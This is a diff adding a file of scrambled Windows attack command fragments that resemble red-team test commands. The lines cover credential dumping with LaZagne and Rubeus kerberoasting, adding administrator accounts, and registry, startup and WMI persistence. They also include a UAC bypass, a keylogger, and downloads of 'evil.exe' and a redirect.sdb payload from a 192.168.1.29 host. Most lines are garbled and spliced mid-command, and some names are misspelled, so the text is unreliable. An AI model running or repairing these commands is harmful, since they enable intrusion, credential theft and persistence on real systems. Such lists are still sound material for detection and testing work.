@@ -1,0 +1,64 @@
+remove-item -path $ { user_name } ;
+esentutl.exe /y `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+tasklist
+lazagne.exe windows
+net localgroup administrators administrators
+reg add `` hklm\software\microsoft\windows -class -user `` `` target `` $ : \programdata\microsoft\windows\start menu\programs\startup\atmoic.lnk '' `` $ filter ; in `` consumer ;
+net user administrator @ `` host `` $ { filename_regex }
+namp -sn $ { filename_regex }
+net user administrator /add
+namp -sn $ wscriptshell.createshortcut kerberoast @ `` system file '' `` $ execution file execution options\mshta.exe '' `` ( `` `` cor_profiler_path '' '' -name $ true
+net user `` domain /add
+lazagne.exe windows
+rubeus.exe = `` $ target /add /add
+set windir= $ { parent_pid } , disabled
+% -new : objectcategory=computer -name : consumer \users\ c : \windows\system32\at.exe $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins @ `` $ { shadow remote_host ;
+stordiag.exe
+net user administrator /add
+net user administrator /add
+net user `` hklm\system\currentcontrolset\control\session t1547.009 -namespace `` hklm\system\currentcontrolset\control\session `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls `` cor_profiler computername= /add
+net user administrator /add
+net consumerargs
+net user `` @ `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /f
+reg add `` hklm\system\currentcontrolset\services\winsock2\parameters `` $ : ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 /t reg_dword /v `` loadappinit_dlls '' -class packages
+net user `` $ `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /f
+iediagcmd.exe /out : $ { shadow copy volumn name you create = $ ( shell.createshortcut keylog
+.\rubeus.exe kerberoast windir volumn you ( `` hklm\software\microsoft\windows set-wmiinstance -namespace 'root/subscription set-wmiinstance , _.creationtime
+tree
+bitsadmin.exe /create /add
+net user administrator /add
+reg `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist '' `` $ { service_name } '' /ve file
+open $ { directory_path }
+ffuf -w $ shortcut $ { filename_regex }
+quser
+fltmc.exe unload = `` defaultaccount binpath=
+$ shortcut = `` '' % \users\
+reg add `` domain /grant administrators '' c : \users\
+net `` hkey_local_machine\software\microsoft\windows '' t1547.009 /user : @ ( `` set-wmiinstance -namespace components\atomic_test '' -value `` cor_profiler '' /t reg_dword
+lazagne.exe windows
+namp -sn $ { filename_regex }
+if ( `` http : :securityprotocol = $ /r -- http : foreach-object ( `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+bypassuac.exe % find `` userinit.exe c : \users\ `` hklm\system\currentcontrolset\control\lsa\
+namp -sn $ { filename_regex } / `` bits_job_name } / $ { password }
+conhost.exe [ -list | `` http : //192.168.1.29:9000/payload/evil.exe ueraccount /all net.securityprotocoltype ] : \microsoft\teams\current\teams.exe
+% localappdata % \microsoft\teams\current\teams.exe
+lazagne.exe windows
+net group `` domain admins `` $ volumn name ) . = `` keylog
+net localgroup administrators `` @ : cor_profiler
+bitsadmin.exe /create
+[ id * : : http : new-object el | \\ { -- localappdata ) % \microsoft\teams\current\teams.exe
+net localgroup administrators administrators
+net localgroup administrators
+psr.exe /start /output $ { shadow cor_enable_profiling ' $ env : \users\
+vssadmin create shadow invoke-screencap $ { -comobject /l } /interactive red lsass ) /a
+conhost.exe [ os ' = appdata % \amsi.dll
+git clone $ ( = `` hklm\software\microsoft\windows cor_profiler
+dir /complete $ wscriptshell.createshortcut `` select *
+net group `` hklm\software\microsoft\windows t1547.009 /v `` hkey_local_machine\system\currentcontrolset\services\ntds '' `` cor_profiler $ : /v `` hkey_local_machine\software\microsoft\windows /v binary
+gpresult /z
+net user administrator /add
+query user
+lazagne.exe eventnamespace='root\cimv2 -filter `` .\lazagne .. exe all
+net group `` exit /grant administrators : @ filter $ { filter = `` volumn name you ( set-wmiinstance -namespace new-object -comobject { /format : = execution \updater.exe
+net user = `` users '' ;
+net shortcut = `` keylog
